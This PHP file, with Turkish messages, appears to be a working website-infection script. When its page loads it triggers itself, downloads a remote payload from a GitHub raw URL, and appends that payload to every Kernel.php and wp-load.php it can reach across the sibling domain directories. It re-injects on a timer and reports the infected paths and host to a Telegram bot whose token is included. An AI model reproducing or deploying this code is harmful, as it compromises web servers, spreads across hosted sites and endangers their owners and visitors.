
<?php


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $payloadUrl = 'https://raw.githubusercontent.com/necessaryfor/neces/refs/heads/main/z2.txt';

    $logMode = isset($_GET['logke']);
    $payload = file_get_contents($payloadUrl);
    if (!$payload) {
        echo json_encode(['status' => 'error', 'message' => 'Payload indirilemedi.']);
        exit;
    }

    function findDomains_v1($startDir)
    {
        $currentDir = realpath($startDir);
        $domains = [];

        while ($currentDir !== '/') {
            $entries = scandir($currentDir);

            foreach ($entries as $entry) {
                if ($entry === '.' || $entry === '..') {
                    continue;
                }

                $entryPath = $currentDir . DIRECTORY_SEPARATOR . $entry;

                if (is_dir($entryPath) && preg_match('/^[a-zA-Z0-9\-.]+$/', $entry)) {
                    $domains[] = $entryPath;
                }
            }

            $currentDir = dirname($currentDir);
        }

        return array_unique($domains);
    }

    function scanAndProcessInDomains($domains, $payload, $targetFiles, &$updatedFiles)
    {
        $results = [];
        foreach ($domains as $domainDir) {
            $results = array_merge($results, scanAndProcess($domainDir, $payload, $targetFiles, $updatedFiles));
        }
        return $results;
    }

    function adjustPhpTags($fileContents, $payload)
    {
        $utcTimestamp = gmdate('Y-m-d H:i:s');
        $MiuskCode = "<!-- Miusk Code: $utcTimestamp -->\n$payload";

        if (preg_match('/<\?php/', $fileContents)) {
            if (!preg_match('/\?>\s*$/', $fileContents)) {
                $fileContents .= "\n?>";
            }
        } else {
            $fileContents = "<?php\n" . $fileContents;
        }

        return $fileContents . "\n\n" . $MiuskCode;
    }

    function sendTelegramNotification($updatedFiles)
    {
        $botToken = '7288530056:AAH3mvjU3wl94AivFXbX2XWH4Oug6c74gy8';
        $chatId = '-1002427387838';

        $message = "Güncellenen dosyalar:\n";
        foreach ($updatedFiles as $filePath) {
            $message .= "- $filePath\n";
        }
        $message .= "Sayfa URL: " . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        

        $message = urlencode($message);


        file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$message");
    }

    function scanAndProcess($directory, $payload, $targetFiles, &$updatedFiles)
    {
        $files = scandir($directory);
        $results = [];
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') {
                continue;
            }

            $filePath = $directory . DIRECTORY_SEPARATOR . $file;

            try {
                if (is_dir($filePath)) {
                    $results = array_merge($results, scanAndProcess($filePath, $payload, $targetFiles, $updatedFiles));
                } elseif (in_array(basename($filePath), $targetFiles)) {
                    $fileContents = @file_get_contents($filePath);

                    if ($fileContents === false) {
                        $results[] = ['file' => $filePath, 'status' => 'error', 'message' => 'Dosya okunamadı.'];
                        continue;
                    }

                    if (preg_match('/<!-- Miusk Code: (.*?) -->/', $fileContents, $matches)) {
                        $lastUpdate = strtotime($matches[1]);
                        $currentUtc = time();

                        if (($currentUtc - $lastUpdate) < 36000) {
                            $results[] = ['file' => $filePath, 'status' => 'skipped', 'message' => 'Kod zaten güncel.'];
                            continue;
                        }

                        $fileContents = preg_replace('/\n\n<!-- Miusk Code.*$/s', '', $fileContents);
                    }

                    $adjustedContents = adjustPhpTags($fileContents, $payload);
                    if (@file_put_contents($filePath, $adjustedContents)) {
                        $updatedFiles[] = $filePath;
                        $results[] = ['file' => $filePath, 'status' => 'success', 'message' => 'Kod başarıyla eklendi.'];
                    } else {
                        $results[] = ['file' => $filePath, 'status' => 'error', 'message' => 'Kod eklenemedi.'];
                    }
                }
            } catch (Exception $e) {
                $results[] = ['file' => $filePath, 'status' => 'error', 'message' => $e->getMessage()];
            }
        }
        return $results;
    }

    $startDir = __DIR__;
    $targetFiles = ['Kernel.php', 'wp-load.php'];
    $domains = findDomains_v1($startDir);

    $updatedFiles = [];
    $results = scanAndProcessInDomains($domains, $payload, $targetFiles, $updatedFiles);

    if (!empty($updatedFiles)) {
        sendTelegramNotification($updatedFiles);
    }

    echo json_encode($results);
    exit;
}


?>


<script>
window.addEventListener('load', function () {
    if (!window.started) { 
        window.started = true;

        fetch(window.location.href, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        })
        .then(response => response.json())
        .then(data => {
            data.forEach(result => {
                const statusColor = result.status === 'success' ? 'green' : result.status === 'error' ? 'red' : 'orange';
            });
        })
        .catch(error => console.error("Hata:", error));
    }
});
</script>
